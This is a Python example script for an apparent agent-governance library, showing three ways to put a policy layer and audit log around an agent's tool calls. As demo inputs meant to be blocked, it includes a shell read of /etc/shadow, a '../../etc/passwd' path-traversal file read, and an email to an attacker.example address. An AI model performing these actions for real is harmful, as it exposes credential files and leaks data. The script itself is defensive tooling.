"""02 - Three ways to attach the same control layer to *any* agent.

    A. Agent protocol   - your agent has `run(task, tools) -> str`; call layer.govern(agent).run(...)
    B. Tool wrapping    - hand `session.wrap(tools)` to an existing framework instead of the raw tools
    C. Hook/callback    - call `session.check(Action(...))` from a framework's own event hooks
                          (for hosted agents or loops where you don't own tool execution)

All three share one policy file and one audit log.

    python examples/02_govern_any_agent.py
"""

from pathlib import Path

from agentgov import Action, Checkpoint, ControlLayer, approve_all
from agentgov.sandbox import ScriptedAgent, SupportDesk

ROOT = Path(__file__).resolve().parent.parent
layer = ControlLayer.from_config(ROOT / "policies" / "support_agent.yaml", approver=approve_all)

# --------------------------------------------------------------------------- A
print("A. Agent protocol")


class MyAgent:
    """Any object with run(task, tools) works - a LangGraph graph, a CrewAI crew, your own loop..."""

    name = "my-agent"

    def run(self, task, tools):
        order = tools["lookup_order"](order_id="A-100")
        tools["run_shell"](command="cat /etc/shadow")  # will be blocked
        return f"Order status: {order}"


result = layer.govern(MyAgent()).run("Where is order A-100?", SupportDesk().tools())
print("   output:       ", result.output)
print("   interventions:", [o.summary() for o in result.interventions])

# --------------------------------------------------------------------------- B
print("\nB. Tool wrapping (e.g. for a framework that takes a list of callables)")
session = layer.session("framework-agent")
guarded = session.wrap(SupportDesk().tools())
# framework_agent = SomeFramework(tools=list(guarded.values()))   <- drop-in
print("   ", guarded["issue_refund"](order_id="A-100", amount=40))
print("   ", guarded["read_file"](path="../../etc/passwd"))

# --------------------------------------------------------------------------- C
print("\nC. Hooks: you observe events, the layer decides")
session = layer.session("hosted-agent")


def on_pre_tool_use(tool_name, tool_input, tags=()):
    """Shape of a typical framework hook. Return False to veto the call."""
    outcome = session.check(Action(Checkpoint.TOOL_CALL, tool=tool_name, args=tool_input,
                                   tags=frozenset(layer.tool_tags.get(tool_name, tags))))
    print(f"    pre_tool_use {tool_name}: {outcome.summary()}")
    return outcome.allowed


on_pre_tool_use("lookup_order", {"order_id": "A-100"})
on_pre_tool_use("send_email", {"to": "x@attacker.example", "subject": "hi", "body": "..."})

# ------------------------------------------------------------------------ audit
print(f"\nOne audit log for all three: {len(layer.audit)} entries, integrity={layer.audit.verify()[0]}")

# A scripted agent just to show the protocol is all you need:
_ = ScriptedAgent(plan=[{"tool": "lookup_order", "args": {"order_id": "A-300"}}], final="{lookup_order}")
